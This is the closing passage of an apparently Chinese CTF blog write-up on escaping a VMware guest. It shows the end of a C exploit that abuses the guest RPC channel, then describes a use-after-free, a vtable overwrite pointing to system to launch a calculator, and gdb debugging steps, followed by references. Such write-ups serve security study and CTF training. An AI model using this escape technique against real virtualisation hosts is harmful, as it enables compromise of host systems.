class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>pay3<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>pay4<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>pay4<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">leak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"text base :%p"</span><span class="token punctuation">,</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>其中修改了长亭师傅的一个魔数，目的是达到no enhanced。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-8b5cc9e9d5519e804249233cc339cad6311cbed7.png" alt="图片.png"></p><p>其中构造的exploit如下。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-62745268f78c644e67b21e14deae7cda0e266705.png" alt="图片.png"><br> 开启四个channel</p><p>然后free（0）</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-00e8aa2fa4011e8f00639154c8b15f85401f4144.png" alt="图片.png"></p><p>set之后再次free(0)</p><p>此时往channel 1 可以写入bss段的地址。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-1f029b2200ee309814087c541c99b32c5e947019.png" alt="图片.png"></p><p>此时fd被链接进去之后可以直接malloc出来然后改写即可。</p><p>此处覆盖的位置为bss段的一处调用</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-f0b3c90d5cbd2ef6d9dc12653e0de4722512a24b.png" alt="图片.png"></p><p>可以看出来这块的虚表调用位置在FE95B0，+8即为FE95B8，所以此处改为system然后第一个参数（FE95C0）改为，弹出计算器的指令即可。</p><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>打开环境，ssh链接guest，然后sudo gdb .&#x2F;vmx -q，使用ps -aux | grep vmx找到对应的进程，attach上去，在ssh端口运行exp即可（记得先打断点，我断在了漏洞函数free的地方，方便看chunk）</p><p>第一次free前</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-406d37c691e6e5004ec90acb50ec506407d0b61b.png" alt="图片.png"></p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-a8120d076ec4a58750eae4727ea33c426a91e60b.png" alt="图片.png"></p><p>直接按了continue。。堆分配特别乱，于是重新来过。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-ec9d59dfbc0332422eecfd0c0d60b445d286bc22.png" alt="图片.png"></p><p>断点找出漏洞函数。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-8d71666bf6ee066a3c9f34c2a562979dee1b3712.png" alt="图片.png"></p><p>这是bufA的地址。记住0x7f35000210f0（user开头区域）</p><p>经过UAF之后，这里把虚表写入bufB，</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-cff1a526e7d67d1e98b8cef0b48deda4cc636949.png" alt="图片.png"></p><p>成功。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-71e566d153b0ff7626917e269648509ed147bf23.png" alt="图片.png"></p><p>查看后发现确实是vtable。</p><p>基址就可以leak出来了。后面是基本的劫持fd操作，不调试了，直接看到弹出计算器。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-fe93a41ccc7f68586129dd5cb19d8944c5f17d54.png" alt="图片.png"></p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="http://sysprogs.com/legacy/articles/kdvmware/guestrpc.shtml">http://sysprogs.com/legacy/articles/kdvmware/guestrpc.shtml</a></p><p><a href="https://github.com/vmware/open-vm-tools/tree/master/open-vm-tools/lib">https://github.com/vmware/open-vm-tools/tree/master/open-vm-tools/lib</a></p><p><a href="https://sites.google.com/site/chitchatvmback/backdoor">https://sites.google.com/site/chitchatvmback/backdoor</a></p><p><a href="https://zhuanlan.zhihu.com/p/27733895">https://zhuanlan.zhihu.com/p/27733895</a></p><p><a href="https://nafod.net/blog/2019/12/21/station-escape-vmware-pwn.html">https://nafod.net/blog/2019/12/21/station-escape-vmware-pwn.html</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>realworld</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
